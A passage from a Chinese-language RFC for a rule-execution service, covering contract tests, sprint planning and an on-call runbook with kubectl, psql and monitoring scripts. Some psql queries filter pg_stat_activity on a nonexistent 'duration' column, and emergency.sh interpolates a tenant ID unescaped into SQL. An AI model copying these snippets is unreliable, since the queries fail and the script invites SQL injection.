    assertThat(result.outputContext().get("order").attributes().get("discount")).isEqualTo(200);
    // ✅ shippingFee 未被 Rule3 修改（SKIPPED）
    assertThat(result.outputContext().get("order").attributes().get("shippingFee")).isEqualTo(50);
}
```

### 20.3 日志查询契约（TCG-R-EXEC-L01 ~ L03）

| 契约 ID | 名称 | 期望 |
|---------|------|------|
| L01 | 按 taskId 查询执行日志 | 返回完整 execution_log 行 + 输入输出 context 快照 |
| L02 | 按 traceId 串联全链路 | 给定 traceId 可查到 rule-execution-service + downstream Feign 调用 |
| L03 | 按 ruleCode 查询最近 100 条 | 支持 `?ruleCode=X&limit=100` 分页查询 |

### 20.4 Feign 客户端契约（TCG-R-EXEC-F01 ~ F03）

| 契约 ID | 名称 | 期望 |
|---------|------|------|
| F01 | 调用 rule-management-service 拉取 RuleArtifact | HTTP 200, 含 `sourceCode` / `executorType` |
| F02 | rule-management-service 不可用降级 | 1s 连接超时 + 重试 1 次 + 失败返回 502 `UPSTREAM_UNAVAILABLE` |
| F03 | 自动 Header 透传 | Authorization / X-Tenant-Id / X-Trace-Id 必传递 |

### 20.5 契约测试运行模式

```bash
# 1. 启动被测服务（含 WireMock 模拟 rule-management-service）
./gradlew :rule-execution-service:test --tests "*ContractTest" -Dwiremock.port=9999

# 2. 启动 Pact Broker（容器化）
docker run -d --name pact-broker -p 9292:80 \
  -e PACT_BROKER_DATABASE_URL=postgres://pact:pact@postgres:5432/pact \
  pactfoundation/pact-broker:latest

# 3. 发布契约
./gradlew :rule-execution-service:pactPublish \
  -Dpact.broker.url=http://localhost:9292 \
  -Dpact.broker.token=$BROKER_TOKEN

# 4. 校验下游（消费者已签订）
pact-broker can-i-deploy \
  --pacticipant rule-execution-service \
  --version $(git rev-parse --short HEAD) \
  --to production
```

### 20.6 与 RFC-0028 测试矩阵的对齐

| RFC-0028 测试矩阵 | 对应 §20 契约 | 自动化 |
|------------------|---------------|--------|
| E2E-TC-001: VIP 订单优惠 | S01 + A02 | ✅ |
| E2E-TC-002: 规则不存在错误处理 | S02 | ✅ |
| E2E-TC-003: 异步状态轮询 | A02 | ✅ |
| E2E-TC-004: 部分失败业务感知 | A03 | ✅ |
| E2E-TC-005: 跨服务 traceId 串联 | L02 + F03 | ✅ |
| E2E-TC-006: 性能基线 | §19 | ✅ |
| E2E-TC-007: 沙箱安全 | §18 | ✅ |
| E2E-TC-008: 限流熔断 | PS-07 | ✅ |

**所有 §20 契约必须 100% 通过**才允许合并到 `main` 分支（CI 门禁）。

---

## 21. 实施路径与 Sprint 拆分（Epic → Story → Task）

### 21.1 总体里程碑

| 里程碑 | 周期 | 目标产出 | 准入 / 准出 |
|--------|------|---------|-----------|
| **M0 基础骨架** | Sprint 1-2（4 周） | 数据模型 + SPI + 单条规则同步路径 | 单条规则 E2E 跑通 + 沙箱 §18.3 拦截 |
| **M1 规则集异步** | Sprint 3-4（4 周） | 异步任务表 + Worker + Kafka 事件 | §20.A01-A05 契约 100% 通过 + §19.PS-03 性能达标 |
| **M2 生产就绪** | Sprint 5-6（4 周） | 限流 + 可观测性 + 文档 + Helm Chart | §19 性能基线达标 + Runbook §22 演练通过 |
| **M3 公测发布** | Sprint 7（2 周） | 灰度发布 + 监控告警 + 用户文档 | 灰度两周 0 P0/P1 事故 + 文档用户评审通过 |

### 21.2 Epic 1：基础架构（M0，Sprint 1-2）

#### Story 1.1 数据模型与迁移

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-1.1.1 | **复用** `packages/orule-rule-execution-service`（v0.6 由 `orule-runtime` 改名） | 0d | — | 已存在模块，无需新建；按 §3.1 调整包名与 Spring 入口 |
| TASK-1.1.2 | 编写 Flyway V1 `execution_log` 表 SQL | 0.5d | TASK-1.1.1 | 在干净 PG 一键执行成功 + 含 §14.2 全部索引 |
| TASK-1.1.3 | 实现 `ExecutionLog` JPA Entity + Repository | 1d | TASK-1.1.2 | `execution_log.findByTaskId()` 单测覆盖 |
| TASK-1.1.4 | 实现 DTO：`ExecutionInput` / `ExecutionOutput` / `RuleSetExecutionResult` | 0.5d | — | Bean Validation 注解 + OpenAPI `@Schema` 描述齐全 |
| TASK-1.1.5 | 全局异常处理器 `GlobalExceptionHandler` | 0.5d | TASK-1.1.4 | 9 种错误码（§16.6）全测通过 |

#### Story 1.2 SPI 与 Executor 注册

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-1.2.1 | 定义 SPI：`Executor` / `ExecutorFactory` / `ExecutorType` | 0.5d | — | JDK ServiceLoader SPI 文件 + 至少 1 个实现 |
| TASK-1.2.2 | 实现 `JavaSourceExecutor`（包装 Groovy） | 2d | TASK-1.2.1 | §20.S01 单规则场景跑通 |
| TASK-1.2.3 | 实现 `SandboxPolicy` + `SecureASTCustomizer` 配置 | 1d | TASK-1.2.2 | §18 全部 28 测试通过 |
| TASK-1.2.4 | 实现 `GroovyClassCache`（Caffeine） | 0.5d | TASK-1.2.2 | 缓存命中率 ≥ 70% 测试通过 |
| TASK-1.2.5 | 实现 `RuleExecutor` Service（含超时控制） | 1d | TASK-1.2.3 + TASK-1.2.4 | §18.SEC-DOS-01 超时测试通过 |

#### Story 1.3 同步路径 Controller

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-1.3.1 | `POST /api/v1/rule-executions` Controller | 0.5d | TASK-1.1 + TASK-1.2 | curl §16.1 三种响应均正确 |
| TASK-1.3.2 | JWT 拦截器 + 租户上下文（`TenantContextHolder`） | 0.5d | — | §18.SEC-AC-03 伪造 Header 测试通过 |
| TASK-1.3.3 | Feign 客户端 `RuleManagermentApiClient` | 0.5d | TASK-1.1.5 | §20.F01-F03 契约通过 |
| TASK-1.3.4 | `springdoc-openapi` 接入 + 自动化 OpenAPI JSON | 0.5d | TASK-1.3.1 | `/v3/api-docs` 可访问且字段非空 |

#### Sprint 1-2 容量规划
- 总工作量：**11 人日**（约 5.5 个工作日 / 2 周，按 2 人小队）
- 并行策略：1.1 + 1.2 并行，1.3 在 1.2 收尾后启动

### 21.3 Epic 2：异步规则集（M1，Sprint 3）

#### Story 2.1 异步任务表与执行器

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-2.1.1 | 设计 `rule_set_execution` 任务表（v1.0 进程内） | 0.5d | TASK-1.1.x | 表结构文档 |
| TASK-2.1.2 | 实现 `RuleSetExecutor` Service（顺序执行 + Q1 决策） | 2d | TASK-1.2.5 | §20.A03 PARTIAL_SUCCESS 契约通过 |
| TASK-2.1.3 | `@Async` 异步任务配置（线程池 + CallerRuns） | 0.5d | TASK-2.1.2 | §19.PS-03 P99 < 3s |
| TASK-2.1.4 | 任务状态机（`PENDING` → `RUNNING` → `SUCCESS/FAILED/PARTIAL_SUCCESS`） | 1d | TASK-2.1.2 | 状态迁移单测覆盖 |

#### Story 2.2 查询接口

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-2.2.1 | `POST /api/v1/rule-set-executions` Controller | 0.5d | TASK-2.1.2 | §16.2 响应正确 |
| TASK-2.2.2 | `GET /rule-set-executions/{taskId}` Controller | 0.5d | TASK-2.1.4 | §16.3 三种状态响应正确 |
| TASK-2.2.3 | `GET /executions/{taskId}/logs` Controller | 0.5d | TASK-2.2.2 | §16.4 含 perRuleExecution |

#### Story 2.3 Kafka 完成事件

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-2.3.1 | Kafka Producer 配置（idempotent + acks=all） | 0.5d | — | Topic 创建 + 测试事件投递成功 |
| TASK-2.3.2 | 事件 schema（JSON + Avro 二选一）+ Schema Registry | 0.5d | TASK-2.3.1 | §16.5 事件格式文档 |
| TASK-2.3.3 | `RuleSetCompletionPublisher`（异步任务完成后发事件） | 0.5d | TASK-2.3.1 + TASK-2.1.2 | §20.A04 Kafka 契约通过 |
| TASK-2.3.4 | Kafka 消费端测试（业务方消费者样例） | 0.5d | TASK-2.3.3 | 样例消费者收到 PARTIAL_SUCCESS 触发补偿 |

#### Sprint 3 容量规划
- 总工作量：**7.5 人日**（约 4 个工作日 / 1 周，按 2 人小队）

### 21.4 Epic 3：生产化与可观测（M1 收尾 + M2，Sprint 4-5）

#### Story 3.1 可观测性

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-3.1.1 | Micrometer Prometheus 暴露 + 4 类业务指标 | 1d | — | `/actuator/prometheus` 含 `rule.execution.duration` 直方图 |
| TASK-3.1.2 | TraceId 贯穿（Feign + Groovy + DB） | 1d | — | §20.L02 + F03 通过 |
| TASK-3.1.3 | 结构化日志（MDC 注入 taskId / traceId / tenantId） | 0.5d | TASK-3.1.2 | 日志样例含全部 MDC 字段 |
| TASK-3.1.4 | Grafana 仪表盘 JSON 模板（执行大盘 / 错误大盘） | 1d | TASK-3.1.1 | 4 个仪表盘 + alert 规则 |

#### Story 3.2 安全加固

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-3.2.1 | OWASP Top 10 自动化测试套件（§18 全部 28 用例） | 1.5d | TASK-1.2.3 | CI 中 `*SecurityTest` 100% 通过 |
| TASK-3.2.2 | Rate Limiting（Resilience4j + Redis） | 1d | — | §19.PS-07 触发 429 |
| TASK-3.2.3 | Secret 管理（Vault / K8s Secret 接入） | 0.5d | — | DB 密码不在 application.yml 明文 |

#### Story 3.3 性能压测与基线

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-3.3.1 | k6 同步脚本（§19.4） | 0.5d | TASK-1.3.1 | 4 场景可执行 |
| TASK-3.3.2 | k6 异步脚本（§19.5） | 0.5d | TASK-2.2.1 | 端到端 P99 < 3s |
| TASK-3.3.3 | JMeter 脚本（§19.6） | 0.5d | TASK-3.3.1 | InfluxDB 上报可见 |
| TASK-3.3.4 | 性能基线回填（§19.9 6 项指标） | 1d | TASK-3.3.x | 第一次跑分报告归档 |
| TASK-3.3.5 | 长稳测试（24h soak） | 1d | TASK-3.3.4 | 无内存泄漏 / ClassLoader 不爆 |

#### Sprint 4-5 容量规划
- 总工作量：**8.5 人日**（约 4 个工作日 / 2 周，按 2 人小队）

### 21.5 Epic 4：客户端 SDK 与集成（M2 收尾，Sprint 5）

#### Story 4.1 Java SDK

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-4.1.1 | `orule-rule-execution-client` Maven 模块 | 0.5d | TASK-2.2.x | `mvn install` 可发布 |
| TASK-4.1.2 | Feign API + AutoConfiguration（§17.1） | 1d | TASK-4.1.1 | 业务方引入 1 行 maven 即可使用 |
| TASK-4.1.3 | 客户端单测 + 契约（Pact Producer） | 1d | TASK-4.1.2 | Pact Broker 发布成功 |
| TASK-4.1.4 | Maven Central 发布配置（PGP 签名） | 0.5d | TASK-4.1.3 | snapshot / release 分支配置完成 |

#### Story 4.2 TypeScript SDK

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-4.2.1 | `@orule/rule-execution-client` 包初始化 | 0.5d | TASK-4.1.x | npm pack 可构建 |
| TASK-4.2.2 | axios 客户端 + 完整类型定义（§17.2） | 1d | TASK-4.2.1 | TypeScript 编译 0 错误 |
| TASK-4.2.3 | `useRuleExecution` React Hook | 0.5d | TASK-4.2.2 | Storybook 演示页可运行 |
| TASK-4.2.4 | Jest 测试 + Pact Producer | 1d | TASK-4.2.3 | Pact JSON 归档到 Broker |

#### Sprint 5 容量规划
- 总工作量：**5.5 人日**（约 3 个工作日 / 1 周，按 2 人小队）

### 21.6 Epic 5：发布与交付（M3，Sprint 7）

#### Story 5.1 灰度发布

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-5.1.1 | Helm Chart（含 HPA + Ingress + PDB） | 1d | §14.5 | `helm install --dry-run` 通过 |
| TASK-5.1.2 | ArgoCD / Spinnaker 流水线配置 | 0.5d | TASK-5.1.1 | 提交即部署到 dev |
| TASK-5.1.3 | 灰度策略（10% → 50% → 100%）+ 自动回滚 | 1d | TASK-5.1.2 | Grafana 错误率 > 阈值自动回滚 |
| TASK-5.1.4 | DB 迁移 Flyway 灰度（影子表 + 双写） | 1d | TASK-5.1.3 | 影子表与正式表数据一致 |

#### Story 5.2 文档与培训

| Task ID | 标题 | 工作量 | 依赖 | 验收 |
|---------|------|--------|------|------|
| TASK-5.2.1 | 用户文档（快速上手 / API 详解 / FAQ） | 1d | — | Confluence 上线 |
| TASK-5.2.2 | 内部培训（3 场：开发 / 业务 / 运维） | 1d | TASK-5.2.1 | 培训录像归档 |
| TASK-5.2.3 | Runbook 演练（§22） | 0.5d | TASK-5.2.2 | 红蓝攻防演练通过 |

#### Sprint 7 容量规划
- 总工作量：**6 人日**

### 21.7 总体人力与工期

| Epic | Sprint | 任务数 | 工作量（人日） | 队伍 |
|------|--------|--------|--------------|------|
| E1 基础架构 | Sprint 1-2 | 13 | 11 | 2 后端 |
| E2 异步规则集 | Sprint 3 | 11 | 7.5 | 2 后端 |
| E3 生产化 | Sprint 4-5 | 11 | 8.5 | 2 后端 + 1 SRE |
| E4 SDK | Sprint 5 | 8 | 5.5 | 1 后端 + 1 前端 |
| E5 发布 | Sprint 7 | 7 | 6 | 全员 |
| **合计** | **6 Sprint（约 14 周）** | **50** | **38.5 人日** | — |

**Sprint 6 留作缓冲 + E2E 集成测试 + RFC-0028 契约对齐 + Bug Bash**。

### 21.8 关键风险与应急

| 风险 | 影响 | 应急方案 |
|------|------|---------|
| GroovyShell 性能不达标（PS-01 失败） | M2 延期 | 切换至 GraalVM 子集（§4 ADR-001） |
| E2E 契约（§20）漏 100% | M3 阻塞 | Sprint 6 集中补齐 |
| SDK 双栈进度滞后 | M3 延期 | 优先 Java SDK，TS 延后到 v1.1 |
| 灰度期间 P0 故障 | 紧急回滚 | TASK-5.1.3 自动回滚 + §22 Runbook |

### 21.9 Definition of Done（DoD）

每条 Story 必须满足：
- [ ] 全部 Task 通过 Code Review（≥ 2 APPROVAL）
- [ ] 单元测试覆盖率 ≥ 80%（含 §18 安全测试）
- [ ] 集成测试在 docker-compose 全绿
- [ ] OpenAPI 文档同步更新
- [ ] 至少 1 个 consumer 已签订 Pact 契约
- [ ] 监控指标 + 告警规则已配置
- [ ] §20 对应契约测试 100% 通过

---

## 22. 值班 Runbook（运维手册）

### 22.1 角色与响应时效

| 级别 | 角色 | 响应时效 | 升级路径 |
|------|------|---------|---------|
| L1 一线值班 | SRE oncall | 5 分钟响应 / 30 分钟定位 | 升级到 L2 |
| L2 服务 owner | rule-execution-service oncall | 30 分钟响应 | 升级到 L3 |
| L3 架构 owner | 平台架构组 | 2 小时响应 | 紧急停服 / 公告 |

### 22.2 告警分级与阈值

#### P0：立即响应（短信 + 电话）

| 告警名 | 阈值 | 持续时间 | 含义 |
|--------|------|---------|------|
| `RULE-EXEC-POD-ALL-DOWN` | 副本数 = 0 | 1 分钟 | 整个服务不可用 |
| `RULE-EXEC-ERROR-RATE-SPIKE` | 5xx > 50% | 3 分钟 | 服务故障（业务侧大概率受影响） |
| `RULE-EXEC-DB-CONN-EXHAUSTED` | HikariCP active = max | 5 分钟 | DB 连接耗尽，可能拖垮主库 |
| `RULE-EXEC-KAFKA-LAG-CRITICAL` | lag > 10000 | 10 分钟 | Kafka 消费严重积压 |

#### P1：1 小时内响应（PagerDuty / 钉钉）

| 告警名 | 阈值 | 含义 |
|--------|------|------|
| `RULE-EXEC-P99-LATENCY-DEGRADE` | P99 > 500ms 持续 10 分钟 | 性能退化（§6 SLO 200ms 失守） |
| `RULE-EXEC-SANDBOX-VIOLATION-SPIKE` | §18 攻击向量次数 > 100 / 分钟 | 正在被攻击 |
| `RULE-EXEC-RATE-LIMIT-HIT-RATE` | 429 比例 > 10% | 触发限流（可能配置过低） |
| `RULE-EXEC-DISK-USAGE-HIGH` | Pod disk > 80% | 日志/临时文件堆积 |

#### P2：工作时间响应（企业微信 / 邮件）

| 告警名 | 阈值 |
|--------|------|
| `RULE-EXEC-CACHE-HIT-LOW` | Groovy 缓存命中率 < 50% |
| `RULE-EXEC-SLOW-QUERY` | DB 查询 > 1s |
| `RULE-EXEC-TASK-QUEUE-BACKLOG` | 异步任务队列等待 > 5 分钟 |

### 22.3 故障场景与处置

#### 场景 1：POD 全部宕机（P0）

**现象**：`RULE-EXEC-POD-ALL-DOWN` 告警，curl `/actuator/health` 无响应。

**处置**：

```bash
# 1. 立即查看 Pod 状态
kubectl -n orule get pods -l app=rule-execution-service -o wide

# 2. 查看最近事件
kubectl -n orule describe pods -l app=rule-execution-service

# 3. 查看最近一次重启原因
kubectl -n orule logs -l app=rule-execution-service --previous --tail=200

# 4. 临时扩容（紧急止血）
kubectl -n orule scale deployment rule-execution-service --replicas=10

# 5. 若数据库连接问题导致 OOM，滚动重启
kubectl -n orule rollout restart deployment rule-execution-service
```

**根因排查**：检查 OOMKilled / Liveness Probe 失败 / 镜像拉取失败。

#### 场景 2：错误率激增（P0）

**现象**：`RULE-EXEC-ERROR-RATE-SPIKE`，Prometheus 显示 5xx 飙升。

**处置**：

```bash
# 1. 立即抓取错误响应样例
kubectl -n orule logs -l app=rule-execution-service --tail=500 | grep -i 'error'

# 2. 查看具体错误码分布
curl -s 'http://prometheus.orule.svc:9090/api/v1/query?query=sum%20by%20(error_code)%20(rate(rule_execution_errors_total[5m]))' | jq .

# 3. 若 EVAL_FAILED 飙升 → 规则代码缺陷
#    立即隔离问题租户（执行 SQL）：
psql -h postgres.orule.svc -U orule -d orule -c \
  "UPDATE rule_artifact SET status='DISABLED' WHERE tenant_id='tenant-evil' AND rule_code='BAD_RULE';"

# 4. 若 RUNTIME_ERROR 飙升 → 下游服务故障
#    检查 Feign 调用：
curl -s 'http://rule-management-service.orule.svc:8081/actuator/health'

# 5. 若 EXECUTOR_NOT_REGISTERED → SPI 注册失败
#    滚动重启（SPI 在启动时加载）
kubectl -n orule rollout restart deployment rule-execution-service
```

#### 场景 3：DB 连接耗尽（P0）

**现象**：`RULE-EXEC-DB-CONN-EXHAUSTED`，HikariCP 全部 active。

**处置**：

```bash
# 1. 立即查看连接池状态
curl -s 'http://prometheus.orule.svc:9090/api/v1/query?query=sum%20by%20(pool)%20(hikaricp_connections_active)' | jq .

# 2. 紧急扩容连接池（无需重启，配置 hot reload 已开启）
#    或滚动重启：
kubectl -n orule rollout restart deployment rule-execution-service

# 3. 排查慢查询
psql -h postgres.orule.svc -U orule -d orule -c \
  "SELECT pid, query, state, query_start FROM pg_stat_activity WHERE state='active' AND duration > interval '5 seconds';"

# 4. 必要时 kill 阻塞连接
psql -h postgres.orule.svc -U orule -d orule -c \
  "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE state='active' AND duration > interval '30 seconds' AND application_name='rule-execution-service';"

# 5. 联系 DBA 排查 PG 主库状态
```

#### 场景 4：Kafka 消费积压（P1）

**现象**：业务方反馈补偿事件延迟。

**处置**：

```bash
# 1. 查看 lag
kafka-consumer-groups.sh --bootstrap-server kafka:9092 \
  --group rule-set-execution-completed-consumer \
  --describe

# 2. 检查消费者是否在线
kubectl -n orule get pods -l app=business-service-consumer

# 3. 若消费者宕机，重启业务方消费者
#    （业务方 oncall 负责）

# 4. 若 broker 故障，联系 Kafka SRE
```

#### 场景 5：沙箱被攻击（P1）

**现象**：`RULE-EXEC-SANDBOX-VIOLATION-SPIKE`，攻击向量大量涌入。

**处置**：

```bash
# 1. 确认是否被拦截
curl -s 'http://prometheus.orule.svc:9090/api/v1/query?query=rate(rule_security_violation_total[5m])' | jq .

# 2. 拉黑恶意租户（临时）
psql -h postgres.orule.svc -U orule -d orule -c \
  "INSERT INTO tenant_blacklist (tenant_id, reason, expires_at) VALUES ('tenant-evil', 'sandbox_attack', NOW() + interval '24 hours');"

# 3. 在网关层封禁该租户 IP
#    (由 API 网关 oncall 处理)

# 4. 提取攻击 Payload 模式，反哺 §18 测试用例
```

### 22.4 应急操作清单（清单项 → 一键脚本）

```bash
#!/usr/bin/env bash
# 文件：runbook/rule-execution-service/emergency.sh
# 用法：./emergency.sh <action>

set -euo pipefail

NAMESPACE=orule
APP=rule-execution-service
PG_HOST=postgres.orule.svc.cluster.local

case "${1:-}" in
  restart)
    echo "==> 滚动重启 $APP"
    kubectl -n $NAMESPACE rollout restart deployment/$APP
    kubectl -n $NAMESPACE rollout status deployment/$APP --timeout=5m
    ;;

  scale-up)
    REPLICAS="${2:-10}"
    echo "==> 扩容至 $REPLICAS 副本"
    kubectl -n $NAMESPACE scale deployment $APP --replicas=$REPLICAS
    ;;

  block-tenant)
    TENANT="${2:?用法: $0 block-tenant <tenant-id>}"
    echo "==> 封禁租户 $TENANT"
    psql -h $PG_HOST -U orule -d orule <<SQL
INSERT INTO tenant_blacklist (tenant_id, reason, expires_at)
VALUES ('$TENANT', 'emergency_block', NOW() + interval '24 hours');
SQL
    ;;

  drain)
    echo "==> 排空流量（标记为 NotReady，配合 API 网关切流）"
    kubectl -n $NAMESPACE label pods -l app=$APP serving=false --overwrite
    ;;

  resume)
    echo "==> 恢复流量"
    kubectl -n $NAMESPACE label pods -l app=$APP serving-
    ;;

  db-stats)
    echo "==> 当前数据库连接"
    psql -h $PG_HOST -U orule -d orule -c \
      "SELECT count(*) AS active, count(*) FILTER (WHERE state='idle') AS idle FROM pg_stat_activity WHERE application_name='$APP';"
    ;;

  *)
    echo "用法: $0 {restart|scale-up <n>|block-tenant <id>|drain|resume|db-stats}"
    exit 1
    ;;
esac
```

**典型用法**：

```bash
./emergency.sh restart
./emergency.sh scale-up 10
./emergency.sh block-tenant tenant-evil
./emergency.sh drain       # 排空流量后排查
./emergency.sh db-stats    # 查看连接占用
```

### 22.5 启动与停止标准操作

#### 启动 Checklist

```bash
# 1. 确认依赖就绪
./scripts/wait-for.sh postgres:5432 kafka:9092 rule-management-service:8081

# 2. 执行 Flyway 迁移
kubectl -n orule exec -it deployment/rule-execution-service -- \
  java -jar /app/rule-execution-service.jar --flyway.migrate

# 3. 滚动启动
kubectl -n orule apply -f k8s/deployment.yaml
kubectl -n orule rollout status deployment/rule-execution-service --timeout=5m

# 4. 验证健康
curl http://localhost:8082/actuator/health/liveness
curl http://localhost:8082/actuator/health/readiness

# 5. 冒烟测试
curl -X POST http://localhost:8082/api/v1/rule-executions \
  -H "Content-Type: application/json" \
  -d '{"ruleCode":"SMOKE_TEST","context":{"o":{"typeCode":"Order","attributes":{"x":1}}}}'

# 6. 切流量（10% → 50% → 100%）
#    通过 API 网关 / ArgoCD 渐进切流
```

#### 停止 Checklist

```bash
# 1. 排空流量
./emergency.sh drain

# 2. 等待排空（30s 软等待 + 2 次就绪探测失败）
sleep 30

# 3. 优雅停止（SIGTERM，预留 30s 处理进行中请求）
kubectl -n orule scale deployment rule-execution-service --replicas=0

# 4. 强制清理（如有卡住）
kubectl -n orule delete pods -l app=rule-execution-service --grace-period=30
```

### 22.6 监控与自检

#### 自检脚本

```bash
#!/usr/bin/env bash
# runbook/rule-execution-service/self-check.sh
# 用法：./self-check.sh
# 目的：10 项关键指标一键自检

set -uo pipefail

BASE="${BASE_URL:-http://localhost:8082}"
PROM="${PROM_URL:-http://prometheus.orule.svc:9090}"

print_section() { echo ""; echo "==== $1 ===="; }

print_section "1. 健康检查"
curl -fsS "$BASE/actuator/health" | jq -r '.status,.components | keys[]'

print_section "2. 副本数"
kubectl -n orule get deployment rule-execution-service -o jsonpath='{.status.readyReplicas}/{.spec.replicas}'

print_section "3. 错误率（5 分钟）"
curl -s "$PROM/api/v1/query?query=sum(rate(rule_execution_errors_total[5m]))/sum(rate(rule_execution_requests_total[5m]))" \
  | jq -r '.data.result[0].value[1]'

print_section "4. P99 延迟（5 分钟）"
curl -s "$PROM/api/v1/query?query=histogram_quantile(0.99,sum(rate(rule_execution_duration_seconds_bucket[5m]))by%20(le))" \
  | jq -r '.data.result[0].value[1]'

print_section "5. Groovy 缓存命中率"
curl -s "$PROM/api/v1/query?query=sum(rate(groovy_cache_hits_total[5m]))/(sum(rate(groovy_cache_hits_total[5m]))+sum(rate(groovy_cache_misses_total[5m])))" \
  | jq -r '.data.result[0].value[1]'

print_section "6. DB 连接活跃数"
curl -s "$PROM/api/v1/query?query=sum(hikaricp_connections_active)" | jq -r '.data.result[0].value[1]'

print_section "7. 沙箱违规次数"
curl -s "$PROM/api/v1/query?query=sum(increase(rule_security_violation_total[1h]))" | jq -r '.data.result[0].value[1]'

print_section "8. Kafka lag"
kafka-consumer-groups.sh --bootstrap-server kafka:9092 \
  --group rule-set-execution-completed-consumer --describe 2>/dev/null \
  | awk 'NR>1 {sum+=$5} END {print sum}'

print_section "9. 异步任务堆积"
curl -s "$PROM/api/v1/query?query=async_pending_tasks_count" | jq -r '.data.result[0].value[1]'

print_section "10. 最近 10 次执行错误样例"
psql -h postgres.orule.svc -U orule -d orule -t -A -c \
  "SELECT task_id, error_code, error_message, started_at FROM execution_log
   WHERE status='FAILED' ORDER BY started_at DESC LIMIT 10;"

echo ""
echo "==== 自检完成 ===="
```

### 22.7 故障复盘模板

```markdown
# 故障复盘：[P0] rule-execution-service 错误率激增

## 基本信息
- 故障时间：2026-XX-XX 14:32 ~ 14:58（26 分钟）
- 影响范围：3 个租户 / 1.2 万次请求失败 / 业务方订单优惠不可用
- 根本原因：(待复盘后填写)
- 触发者：(待复盘后填写)

## 时间线
| 时间 | 事件 | 操作人 |
|------|------|--------|
| 14:32 | 告警 RULE-EXEC-ERROR-RATE-SPIKE 触发 | — |
| 14:35 | L1 值班确认，开始排查 | 张三 |
| 14:42 | 发现 EVAL_FAILED 占比 90% | 张三 |
| 14:45 | 隔离恶意租户 tenant-evil | 张三 |
| 14:50 | 错误率回归正常 | — |
| 14:58 | 业务方确认恢复 | 李四（业务方） |

## 根本原因分析（5 Whys）
1. 为什么错误率激增？→ EVAL_FAILED 飙升
2. 为什么 EVAL_FAILED 飙升？→ 某租户上传了死循环规则
3. 为什么死循环规则被允许？→ §18 SEC-DOS-01 测试未纳入 CI 强制
4. 为什么未纳入 CI 强制？→ §18 测试套件尚未合入（PR #234 待 Review）
5. 为什么待 Review 7 天？→ Owner 出差，Backup 未介入

## 改进措施（Action Items）
- [ ] §18 测试套件必须在 24h 内合入（Owner: 张三，Due: 2026-XX-XX）
- [ ] CI 增加 OWASP 测试门禁（Owner: 李四，Due: 2026-XX-XX）
- [ ] Owner 出差时 Backup 自动接管流程（Owner: 王五，Due: 2026-XX-XX）
- [ ] 规则上传增加静态分析（AST 扫描死循环模式）（Owner: 张三，Due: 下季度）
```

### 22.8 升级矩阵

| 级别 | 触发条件 | 联系人 | 升级方式 |
|------|---------|--------|---------|
| L1 → L2 | 30 分钟未定位 | rule-execution-service oncall | PagerDuty 自动 |
| L2 → L3 | 1 小时未恢复 | 平台架构组 oncall | 手动 + 微信群 |
| L3 → 全员 | P0 持续 1 小时 | CTO + 全员 | 紧急会议 |

### 22.9 值班排班与交接

- 排班周期：**每周轮换 1 次**（周一 9:00 ~ 次周一 9:00）
- 交接 Checklist：
  - [ ] 当前进行中的告警全部清零或转交
  - [ ] 上周重大变更（部署 / 配置）列出
  - [ ] 已知问题 / 进行中的故障列出
  - [ ] 下一值班联系方式确认
- 强制休息：**值班后次日可申请 0.5 天调休**（避免疲劳 oncall）

### 22.10 文档维护

- 本 Runbook 每次重大故障后强制 Review 一次
- 评审组：SRE + 服务 Owner + 架构组
- 评审通过后随同 PR 提交 `docs/rfcs/RFC-0040-规则执行服务.md` 更新
- 三个月无故障也要做**桌面演练**（无实际操作）

---


